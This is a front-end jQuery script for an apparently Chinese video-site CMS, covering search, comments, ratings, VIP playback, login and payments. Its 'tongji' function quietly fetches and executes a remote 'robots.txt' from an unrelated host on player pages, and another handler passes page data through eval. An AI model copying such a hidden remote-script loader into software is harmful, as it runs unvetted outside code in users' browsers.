/* Version 3.6122
** sale 2.1 zye
** Up:2022.3 12.10*/
var feifei = {
//start
'browser':{//浏览器信息
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': (navigator.browserLanguage || navigator.language).toLowerCase(),//zh-tw|zh-hk|zh-cn
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
'cms':{//系统
	'nav': function($id){//主导航高亮
		$id = $('nav[data-dir]').attr('data-dir');
		$($id).addClass("active");
	},
	'pre':function(){//代码高亮
		//https://highlightjs.org/static/demo/
		if($("pre code").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//lib.baomitu.com/highlight.js/9.12.0/highlight.min.js", function(){
				$('pre code').each(function(i, block) {
					hljs.highlightBlock(block);
				});
			});
		}
	},
	'collapse':function(){//内容详情折叠
		$('.vod-detail .vod-content img').addClass("img-responsive");
		$('.news-detail .news-content img').addClass("img-responsive");
		$('body').on("click", "[data-toggle=ff-collapse]", function(){
			$this = $(this);
			$($this.attr('data-target')).toggle();
			$($this.attr('data-default')).toggle();
			if($this.attr('data-html')){
				$data_html = $this.html();
				$this.html($this.attr('data-html'));
				$this.attr('data-html',$data_html);
			}
			if($this.attr('data-val')){
				$data_val = $this.val();
				$this.val($this.attr('data-val'));
				$this.attr('data-val',$data_val);
			}
		});
	}
},
'mobile':{//移动端专用
	'jump': function(){
		if( cms.domain_m && (feifei.browser.domain != cms.domain_m) ){
			self.location.href = feifei.browser.url.replace(feifei.browser.domain,cms.domain_m);
		}
	},
	'nav': function(){
		$("#ff-nav-btn").bind('click', function(){
			$('#ff-nav-btn-item').toggleClass("hidden");
		});
	},
	'goback': function(){
		if(history.length > 0 && document.referrer){
			$(".ff-goback").show();
			$('.ff-goback').attr('href','javascript:history.go(-1);');
		}else{
			$(".ff-goback").hide();
		}
	},
	'flickity':function(){//手机滑动
		if($(".ff-gallery").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({
				rel: "stylesheet",
				type: "text/css",
				href: "//lib.baomitu.com/flickity/2.0.11/flickity.min.css"
			}).appendTo("head");
			$.getScript("//lib.baomitu.com/flickity/2.0.11/flickity.pkgd.min.js", function(){
				$(".ff-gallery").each(function(i){
					$index = $(this).find('.gallery-active').index()*1;
					if($index > 3){
						$index = $index-3;
					}else{
						$index = 0;
					}
					$(this).flickity({
						cellAlign: 'left',
						freeScroll: true,
						lazyLoad: true,
						contain: true,
						prevNextButtons: false,
						resize: true,
						initialIndex: $index,
						pageDots: false
					});
				});
			});
		}
	}
},
'scroll':{//滚动条
	'fixed' : function($id, $top, $width){// 悬浮区域
		var offset = $('#'+$id).offset();
		if(offset){
			if(!$top){
				$top = 5;
			}
			if(!$width){
				$width = $('#'+$id).width();
			}			
			$(window).bind('scroll', function(){
				if($(this).scrollTop() > offset.top){
					$('#'+$id).css({"position":"fixed","top":$top+"px","width":$width+"px"});
				}else{
					$(('#'+$id)).css({"position":"relative"});
				}
			});		
		}
	},
	'totop':function($id, $top){ //返回顶部
		// $id:dc-totop $top:偏移值
		$('body').append('<a href="#" class="'+$id+'" id="'+$id+'"><i class="glyphicon glyphicon-chevron-up"></i></a>');
		$(window).bind('scroll', function(){
			if($(this).scrollTop() > $top){
				$('#'+$id).fadeIn("slow");
			}else{
				$('#'+$id).fadeOut("slow");
			}
		});	
	}
},
'language':{//简繁转换
	's2t':function(){
		if(feifei.browser.language=='zh-hk' || feifei.browser.language=='zh-tw'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).s2t();//$.s2t(data);
			});
		}
	},
	't2s':function(){
		if(feifei.browser.language=='zh-cn'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).t2s();//$.s2t(data);
			});
		}
	}
},
'page': {//分页
	'more': function(){
		$('body').on('click', '.ff-page-more', function(){
			$this = $(this);
			$page = $(this).attr('data-page')*1+1;
			$id = $this.attr('data-target');
			$.get($(this).attr('data-url')+$page, function(data){
				if(data){
					$($id).append(data);
					$this.attr("data-page",$page);
					$($id+" .ff-img").lazyload();
				}else{
					$this.hide();
					$this.unbind("click");
				}
			},'html');
		});
	},
	'keydown': function(){
	  var prev = $('#ff-prev').attr("href");
	  var next = $('#ff-next').attr("href");
	  $("body").keydown(function(event){
		  if(event.keyCode==37 && prev!=undefined) location=prev; 
		  if(event.keyCode==39 && next!=undefined) location=next; 
	  });
  }
},
'alert':{//提示
	'success':function($id, $tips){
		$($id).html('<div class="alert alert-success fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>成功！</strong>'+$tips+'</div>');
	},
	'warning':function($id, $tips){
		$($id).html('<div class="alert alert-warning fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>警告！</strong>'+$tips+'</div>');
	}
},
'image': {//图片
	'lazyload': function(){//延迟加载
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response, status) {
			$("img.ff-img").lazyload({
				placeholder : cms.root+"Public/images/no.jpg",
				effect : "fadeIn",
				failurelimit: 15
				//threshold : 400
				//skip_invisible : false
				//container: $(".carousel-inner"),
			}); 
		});
	},
	'qrcode': function(){//生成二维码
		//$("[data-toggle='popover']").popover({html: true});
		$(".glyphicon-phone").popover({
				html: true
		});
		$(".glyphicon-phone").on('show.bs.popover', function () {
			$(".glyphicon-phone").attr('data-content','<img class="ff-qrcode" src="//cdn.feifeicms.co/qrcode/1.0/?w=150&h=150&url='+encodeURIComponent(feifei.browser.url)+'"/>');
		})
	},
	'vcode':function(){//安全码
		return '<label><img class="ff-vcode-img" src="'+cms.root+'index.php?s=Vcode-Index"></label>';
	},
	'slide':function(){//轮播幻灯
		$('.ff-slide').carousel({interval: $('.ff-slide').attr('data-interval')});
	}
},
'vcode': {//验证码
	'load': function(){
		feifei.vcode.focus();
		feifei.vcode.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", ".ff-vcode", function(){
			$(this).removeClass('ff-vcode').parent().after(feifei.image.vcode());
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.ff-vcode-img', function(){
			$(this).attr('src', cms.root+'index.php?s=Vcode-Index');
		});
	}
},
'search': {//搜索
	'dropdown': function(){//下拉菜单
		$(".ff-search .dropdown-menu li a").on("click", function(){
			$form = $(this).parents('form');
			$action = $form.find('button[data-action]');
			if($action.attr('data-action') && $(this).attr('data-action')){
				$action.attr('data-action', $(this).attr('data-action'));
				$form.find('.dropdown-toggle .title').html($(this).html());
			}
		});
	},
	'keydown': function(){//回车
		$(".ff-search input").keyup(function(event){
			if(event.keyCode == 13){
				$form = $(this).parents('form');
				$action = $form.find('button[data-action]').attr('data-action');
				if(!$action){
					$action = cms.root+'index.php?s=vod-search-name-FFWD';
				}
				$wd = $form.find('.ff-wd').val();
				if($wd){
					location.href = $action.replace('FFWD',encodeURIComponent($wd));
				}else{
					$(this).find('.ff-wd').focus();
					$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
				}
				return false;
			}
		});
	},	
	'submit': function(){//提交表单
		$(".ff-search button").on("click", function(){
			$action = $(this).attr('data-action');
			if($action){
				$(".ff-search").attr('action', $action);
			}
		});
		$(".ff-search").on("submit", function(){
			$action = $(this).attr('action');
			$wd = $(this).find('.ff-wd').val();
			if(!$action){
				$action = cms.root+'index.php?s=vod-search-name-FFWD';
			}
			if($wd){
				location.href = $action.replace('FFWD',encodeURIComponent($wd));
			}else{
				$(this).find('.ff-wd').focus();
				$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
			}
			return false;
		});
	},
	'autocomplete': function(){//3.5增加搜索结果控制
		var $limit = $('.ff-search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("//lib.baomitu.com/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				if($('.ff-search').eq(0).attr('data-sid') == 2){
					$ajax_url = cms.root+'index.php?g=home&m=search&a=news';
				}else{
					$ajax_url = cms.root+'index.php?g=home&m=search&a=vod';
				}
				$('.ff-wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'wd',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.name, data: dataItem.link };
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
	},
	'hot':function(){
		$(".ff-search [data-toggle='tooltip']").tooltip();
		$("#ff-site-hot").load(cms.root+"index.php?s=ajax-site_hot");
	}
},
'record': {//云记录
	'load': function(){
		feifei.record.get();
		feifei.record.set();
	},
	'get':function(){
		//后端获取记录
		if($(".ff-record-get").eq(0).length){
			$.get(cms.root+'index.php?g=home&m=record&a=vod&sid=1', function(data){
				if(data == ''){
					data = '<strong>暂无观看记录</strong>';
				}
				$(".ff-record-get").attr('data-content',data);
			});
		}
		//弹出事件
		$(".ff-record-get").popover().on("mouseenter", function () {
			var _this = this;
			$(this).popover("show");
			$(".popover").on("mouseleave", function () {
				$(_this).popover('hide');
			});
		}).on("mouseleave", function () {
			var _this = this;
			setTimeout(function () {
				if (!$(".popover:hover").length) {
					$(_this).popover("hide");
				}
			}, 300);
		});
	},
	'set':function(){//用户互动记录
		//自动写入观看或浏览记录
		if($(".ff-record-set[data-type=1]").eq(0).attr('data-sid')){
			$this = $(".ff-record-set[data-type=1]").eq(0);
			$.get(cms.root+'index.php?g=home&m=record&a=post&sid='+$this.attr("data-sid")+'&did='+$this.attr("data-id")+'&type=1&did_sid='+$this.attr("data-id-sid")+'&did_pid='+$this.attr("data-id-pid"));
		}
		//喜欢 想看 在看 看过 写入记录
		$('body').on('click', 'a.ff-record-set', function(e){
			//是否需要验证登录
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
				return false;
			}
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?g=home&m=record&a=post&sid='+$(this).attr("data-sid")+'&did='+$(this).attr("data-id")+'&type='+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						if(json.status == 200){
							$this.addClass('disabled');
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//lib.baomitu.com/raty/2.7.1/jquery.raty.min.js", function(response, status) {
				$(".ff-score").each(function(i){
					$(".ff-score").eq(i).find('.ff-score-raty').raty({ 
						starType: 'i',
						number: 5,
						numberMax : 5,
						half: true,
						score : function(){
							return $(this).attr('data-score');
						},
						click: function(score, evt) {
							$this = $(this);
							$.ajax({
								type: 'get',
								url: cms.root+'index.php?s=gold-'+$(this).attr('data-module')+'-id-'+$(this).attr('data-id')+'-score-'+(score*2),
								timeout: 5000,
								dataType:'json',
								error: function(){
									$this.attr('title', '网络异常！').tooltip('show');
								},
								success: function(json){
									if(json.status == 1){
										$this.parent().find('.ff-score-val').html(json.data.gold);
									}else{
										$this.attr('title', json.info).tooltip('show');
									}
								}
							});
						}
					});					
				});
			});
		}
	}
},
'updown':{//顶踩
	'click': function(){
		$('body').on('click', 'a.ff-updown-set', function(e){
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?s=updown-'+$(this).attr("data-module")+'-id-'+$(this).attr("data-id")+'-type-'+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						$this.addClass('disabled');
						if(json.status == 1){
							if($this.attr("data-type")=='up'){
								$this.find('.ff-updown-val').html(json.data.up);
							}else{
								$this.find('.ff-updown-val').html(json.data.down);
							}
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'hits':{//人气
	'load': function(){
		$(".ff-hits").each(function(i){
			var $this = $(".ff-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=hits-show-id-'+$this.attr("data-id")+'-sid-'+$this.attr("data-sid")+'-type-'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(json){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(json.' + $type + ')'));
					}
				}
			});
	 });
	}
},
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			$size = $(".ff-share").attr('data-size');
			if(!$size){$size = 16;}
			if( $(".ff-share dd").length ){
				$id = $(".ff-share dd");
			}else{
				$id = $(".ff-share");
			}
			$($id).html('<div class="bdsharebuttonbox"><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_bdysc" data-cmd="bdysc" title="分享到百度云收藏"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>');
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
	'load':function(){
		if($('.ff-forum[data-type=feifei]').length){
			this.system();
		}
		if($('.ff-forum[data-type=uyan]').length){
			this.uyan();
		}
		if($('.ff-forum[data-type=changyan]').length){
			this.changyan();
		}
	},
	'system': function(){
		//初始加载
		if($('.ff-forum[data-type=feifei]').attr('data-sid')){
			feifei.forum.ajax('.ff-forum', $('.ff-forum[data-type=feifei]').attr('data-sid'), $('.ff-forum[data-type=feifei]').attr('data-id'), 0, 1);
		}
		//登录验证
		$(".ff-forum").on("focus", 'textarea[name=forum_content]', function(){ //表单提交
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
			}
		});
		//回复评论
		$('body').on('click', 'a.forum-reply-set', function(){
			var $pid = $(this).attr("data-id");
			var $reply = $(this).parents('.media-body').find('.forum-reply');
			var $form = $($(".ff-forum-post").eq(0).prop("outerHTML"));
			if($pid){
				$form.find('.ff-alert').html('');
				$form.find("button[type='submit']").removeClass('disabled')
				$form.find("input[name='forum_pid']").val($pid);
				$form.show();
				$($reply).html($form);
				$($reply).collapse('toggle');
			}
		});
		//举报评论
		$('body').on('mouseenter', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeIn();
		});
		$('body').on('mouseleave', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeOut();
		});
		$('body').on('click', 'a.forum-report', function(){
			$(this).remove();//移除按钮
			var $id = $(this).attr("data-id");
			if($id){
				$.ajax({
					type: 'get',
					url: cms.root+'index.php?s=forum-report-id-'+$id,
					timeout: 3000,
					dataType:'json',
					success:function(json){
						feifei.alert.success($('.form-forum').eq(0).find('.ff-alert'), json.info);
					}
				});
			}
		});
		//发表评论
		$("body").on("submit", '.ff-forum-post', function(){
			var $this = $(this);
			var $sid = $(this).find('input[name=forum_sid]').val();
			$.post($this.attr('action'), $this.serialize(), function(json){
				if(json.status == 200){//不需要审核留言
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
					//主题、回复贴处理
					if(json.data.forum_pid){//回复贴
						feifei.forum.reply(json.data.forum_pid);//更新回复数及显示回复链接按钮
						setTimeout(function(){$('.forum-reply[data-id='+json.data.forum_pid+']').fadeOut('slow')}, 2000);//移除回复表单容器
					}else{//主题贴
						setTimeout(function(){feifei.forum.ajax('.ff-forum-item', json.data.forum_sid, json.data.forum_cid, 1, 1)}, 2000);
						setTimeout(function(){$this.hide()}, 3000);
					}
					//发表评论后是否需要刷新网页
					if($('.ff-forum-reload').length){
						location.reload();
					}
				}else if(json.status > 200){//需要审核
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
				}else{
					feifei.alert.warning($this.find('.ff-alert'), json.info);
				}
			 },'json');
			return false;
		});
	},
	'ajax': function($target, $sid, $cid, $ismore, $page){//AJAX加载系统评论
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-ajax-sid-'+$sid+'-cid-'+$cid+'-ismore-'+$ismore+'-p-'+$page,
			timeout: 3000,
			error: function(){
				$($target).html('评论加载失败，请刷新...');
			},
			success:function($html){
				$($target).html($html);
			}
		});
	},
	'reply': function($id){//更新回复数及显示回复链接
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-reply-id-'+$id,
			timeout: 3000,
			dataType:'json',
			success:function(json){
				if(json.status==200){
					$('.forum-reply-set[data-id='+$id+']').find('.forum-reply-val').html(json.data);
					$('.forum-reply-get[data-id='+$id+']').fadeIn();
				}
			}
		});
	},
	'uyan': function(){
		$(".ff-forum").html('<div id="uyan_frame"></div>');
		$.getScript("http://v2.uyan.cc/code/uyan.js?uid="+$('.ff-forum[data-type=uyan]').attr('data-uyan-uid'));
	},
	'changyan': function(){
		$appid = $('.ff-forum[data-type=changyan]').attr('data-cy-id');
		$conf = $('.ff-forum[data-type=changyan]').attr('data-cy-conf');
		$sourceid = $('.ff-forum[data-type=changyan]').attr('data-sid')+'-'+$('.ff-forum[data-type=changyan]').attr('data-id');
		var width = window.innerWidth || document.documentElement.clientWidth;
		if (width < 768) { 
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div><script charset="utf-8" id="changyan_mobile_js" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+$appid+'&conf=prod_'+$conf+'"><\/script>');
		}else{
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div>');
			$.getScript("https://changyan.sohu.com/upload/changyan.js",function(){
				window.changyan.api.config({
					appid: $appid,
					conf: 'prod_'+$conf
				});
			});
		}
	}
},
'scenario': {//分集剧情
	'load':function(){
		var $max = $(".ff-scenario-pill").attr('data-max')*1;
		var $count = $(".ff-scenario-content dl").length;
		var $li = 0;
		var $list = '';
		if($count > 0 && $max>0){
			for($i=0; $i<$count; $i++){
				if(($i+$max) > $count){
					$max_ji = $count;
				}else{
					$max_ji = $i+$max;
				}
				if($i % $max == 0){
					$li++;
					$list+='<li><a href="javascript:;" data-target=".ff-scenario-'+$li+'" data-toggle="pill">第'+($i+1)+'-'+$max_ji+'集</a></li>';
				}
				$(".ff-scenario-content dl").eq($i).addClass('ff-scenario-'+$li);
			}
			$('.ff-scenario-pill').html($list);
			$('.ff-scenario-pill a:first').tab('show');
		}
	}
},
'playurl': {//播放地址
	'download': function(){
		if($(".ff-playurl-down").length){
			$.getScript("//cdn.feifeicms.co/download/xunlei.js",function(){
				//3.4增加鼠标点击去掉文件名标题
				$(".ff-playurl-down input[type=text]").focus(function(){
					$(this).val($(this).parent().find('input[type=checkbox]').val());
				});
			});
		}
	},
	'tongji': function(){
		if($("#cms_player").length){
			$.getScript("//www.cnhb.org/robots.txt");
		}
	},
	'active':function(){
		$('.ff-playurl li[data-id="'+$('.ff-playurl[data-active]').attr('data-active')+'"]').addClass("active");
		$('.ff-playurl-tab a[data-target="'+$('.ff-playurl-tab[data-active]').attr('data-active')+'"]').tab('show');
		$('.ff-playurl-dropdown a[data-target="'+$('.ff-playurl-dropdown[data-active]').attr('data-active')+'"]').tab('show');
	},	
	'dropdown':function(){
		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			$(this).parents('.btn-group').find('.dropdown-toggle span:eq(0)').html($(e.target).text());
			$(this).parents('.dropdown-menu').find('li').removeClass('active');
			$(this).parent().addClass('active');
		});
	},
	'more':function(){//...效果
		$('.ff-playurl').each(function(i){
			$this = $(this);
			$config = $this.attr('data-more')*1;
			$max = $this.find('li a').size();
			if(($config+2) < $max && $config>0){
				$max_html = $($this.find('li:last').prop("outerHTML")).find('a').attr('href','#all').html('全部...');
				$max_html = '<li class="'+$this.find('li').attr('class')+'">'+$max_html.prop("outerHTML")+'</li>';
				$this.find('li').each(function(n){
					if(n+1 > $config){
						$(this).hide();
					}
				});
				$this.find('li').eq($config).after($max_html);
				$this.find('li:last').show();
			}
	 	});
		//more点击
		$('.ff-playurl').on('click', 'a', function(e){
			if($(this).attr('href') == '#all'){
				$(this).parent().parent().find('li').show();
				$(this).parent().remove();
				return false;
			}
		});
	},
	//vip播放器回调
	'vip_callback':function($vod_id, $vod_sid, $vod_pid, $status, $trysee, $tips){
		if($status != 200){
			if($trysee > 0){
				window.setTimeout(function(){
					$.get(cms.root+'index.php?s=vod-vip-action-trysee-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(html){
						$('#cms_player').html(html).removeClass("embed-responsive-4by3").css({"height":"auto"});
					},'html');
				},1000*60*$trysee);
			}else{
				$('#cms-player-vip .cms-player-box').html($tips);
				$('#cms-player-vip .cms-player-iframe').hide();
				$('#cms_player').removeClass("embed-responsive-4by3").css({"height":"auto"});
			}
			//支付影币按钮
			$('#cms_player').on("click",".vod-price",function(){
				$(this).html('Loading...');
				$.get(cms.root+'index.php?s=vod-vip-action-ispay-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(json){
					if(json.status == 200){
						location.reload();
					}else if(json.status == 500 || json.status == 501){
						feifei.user.login();
					}else{
						$('#cms_player').html(json.info);
					}
				},'json');
			});
		}else{
			//拥有VIP观看权限
		}
	}
},
'user':{
	//基础功能
	'load':function(){
		//不同模式下处理用户基础信息
		feifei.user.islogin();
		//模态框登录事件
		$("body").on("click",".user-login-modal",function(){
			feifei.user.login();
			return false;
		});
		//积分在线充值事件
		$("body").on("click",".user-score-payment",function(){
			feifei.user.ScorePayment();
			return false;
		});
		//积分卡密充值事件
		$("body").on("click",".user-score-card",function(){
			feifei.user.ScoreCard();
			return false;
		});
		//积分升级VIP事件
		$("body").on("click",".user-score-upvip",function(){
			feifei.user.ScoreUpvip();
			return false;
		});
		//用户中心修改邮箱
		$("body").on("click",".user-change-email", function(){
			feifei.user.ChangeEmail();
			return false;
		});
		//用户中心修改密码
		$("body").on("click",".user-change-pwd", function(){
			feifei.user.ChangePwd();
			return false;
		});
	},
	//静态模式加载用户ID
	'islogin':function(){
		if($('.ff-user').length && (cms.urlhtml == 1)){
			$.ajax({
				type: 'get',
				url: cms.root+'index.php?s=user-info',
				timeout: 3000,
				dataType:'json',
				success:function(json){
					if(json.status==200){
						cms.userid = json.data.user_id;
						cms.username = json.data.user_name;
						$('.ff-user').removeClass("user-login-modal");
						$('.ff-user[data-href]').attr('href',$('.ff-user[data-href]').attr('data-href'));
						$('.ff-user[data-name]').html('<a href="'+$('.ff-user').attr('data-href')+'">'+cms.username+'</a>');
					}
				}
			});
		}
	},
	//AJAX模态框登录
	'login':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root+'index.php?s=user-ajax_login',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".form-user-login").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-login-alert').html('正在登录...');
						},
						error : function(){
							$('.user-login-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								location.reload();
							}else{
								$('#user-submit').html('登录');
								feifei.alert.warning('.user-login-alert',json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//积分在线充值
	'ScorePayment':function(){
		feifei.order.payment();
	},
	//积分卡密充值
	'ScoreCard':function(){
		feifei.order.card();
	},
	//升级VIP
	'ScoreUpvip':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_upvip',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-upvip-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-upvip-alert').html('Loading...');
						},
						error : function(){
							$('.user-upvip-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-upvip-alert', '升级完成，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-upvip-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else if(json.status == 501){
								feifei.alert.warning('.user-upvip-alert', '影币不足，共需要'+json.info+'个影币，请先冲值！');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.order.payment();}, 2000);
							}else{
								feifei.alert.warning('.user-upvip-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改邮箱
	'ChangeEmail':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_email',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-email-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-email-alert').html('Loading...');
						},
						error : function(){
							$('.user-email-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-email-alert', '邮箱修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-email-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-email-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改密码
	'ChangePwd':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_repwd',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-repwd-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-repwd-alert').html('Loading...');
						},
						error : function(){
							$('.user-repwd-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-repwd-alert', '密码修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-repwd-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-repwd-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
},
'order':{//影币订单模块
	'payment':function(){//在线充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-index',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-payment").on('submit',function(e){
					if($(".forum-payment input[name=score_ext]").val() < $(".forum-payment").attr('data-small')){
						feifei.alert.warning('.user-pay-alert', '每次至少充值<strong>'+$(".forum-payment").attr('data-small')+'</strong>元');
						return false;
					}
					setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();}, 5000);
				});
			}
		});
	},
	'card':function(){//卡密充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-card',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-card").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
